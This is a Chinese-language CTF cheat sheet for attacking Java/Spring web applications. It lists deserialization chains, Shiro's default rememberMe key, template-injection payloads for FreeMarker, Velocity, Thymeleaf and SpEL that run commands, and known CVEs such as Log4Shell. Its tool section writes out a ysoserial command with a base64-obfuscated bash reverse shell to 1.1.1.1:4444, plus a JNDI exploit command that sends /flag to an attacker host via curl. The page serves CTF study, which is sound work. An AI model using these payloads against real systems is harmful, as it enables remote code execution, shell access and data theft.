---
comments: true
---

# Java

> WEB · 语言专题。Java/Spring 生态攻防:反序列化、模板注入、命令执行。标签:**反序列化**、**模板注入**、**命令执行**。

## 触发特征

- `JSESSIONID`、`Set-Cookie: rememberMe=...`(Shiro)、Spring Boot 报错页(Whitelabel)、`/.actuator`。
- base64 序列化对象(`rO0AB`)、`aced0005` 魔数、HashMap/ArrayList 传输对象。

## 反序列化

- **ysoserial 套路**:CC1/CC6(commons-collections)、CB1、Jdk7u21 等链;`java -jar ysoserial.jar CommonsCollections6 'cat /flag' | base64` 打入 cookie/body。
- **XMLDecoder RCE**:XML 格式反序列化任意方法调用(HackIM 2016);常见于 `.xml` 配置解析接口。
- **Shiro**:rememberMe AES-CBC(默认 key `kPH+bIxk5D2deZiIxcaaaA==`)反序列化;先打 key 爆破再套 ysoserial 链(注意 padding oracle 与 CBCGadget)。
- **TiedMapEntry + LazyMap**:HashMap 反射补丁后的新链构造(Trend Micro CTF 2018)。
- **Castor XML `xsi:type` 多态反序列化**(Atlas HTB);**.NET 走 `TypeNameHandling $type`**(DefCamp 2017,见 [Windows相关](windows.md))。
- **HQL 注入**:Hibernate 查询注入,非断行空格解析分歧(HackIM 2016)。
- JNDI 入口(RMI/LDAP lookup)在反序列化链中作为最终执行手段;高版本 JDK 需绕 trustURLCodebase → 本地 factory利用。

## 模板注入

- **Thymeleaf**:`__${expr}__::.x` 预处理表达式;SpEL 注入配合 Spring `FileCopyUtils` 绕 WAF(ApoorvCTF 2026)。
- **Velocity**:`#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))...`;OGNL(Struts2 系)按 S2-xxx 编号打。
- **FreeMarker**:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。
- Spring SpEL 直接注入:`T(java.lang.Runtime).getRuntime().exec(...)`。

## 命令执行

- Runtime/ProcessBuilder 反射调用是所有链的落点;无回显时用 `curl`/DNS 外带或写文件到静态目录。
- 表达式注入面:Spring `@Value`、Shiro 权限串、Activiti 工作流。
- 文件写入型:tomcat 写 jsp(注意解析路径)、`Files.copy` 任意写。
- SSRF 打内网 Spring actuator `/env` + `/restart` 或 Eureka 注册恶意服务。

## 高频 CVE 匹配

- Spring4Shell(CVE-2022-22965)、Log4Shell(CVE-2021-44228,`${jndi:ldap://}`)、Fastjson autoType(`@type` 指向 JdbcRowSetImpl)、Jackson enableDefaultTyping、XStream 反序列化。
- SAML:XPath 摘要走私 CVE-2024-45409(ruby-saml);Zabbix 时间盲注 CVE-2024-22120;TeamCity REST RCE。

## 工具速查

```bash
java -jar ysoserial.jar CC6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > pay.bin
java -jar JNDI-Injection-Exploit-1.0.jar -C "curl http://attacker/$(cat /flag)" -A 1.1.1.1
```

## 转向

- 反序列化基础语法与流 → 本页;构造内存马(哥斯拉/冰蝎Filter型)后流量识别 → [Misc-WEB流量分析](../misc/web-traffic.md)
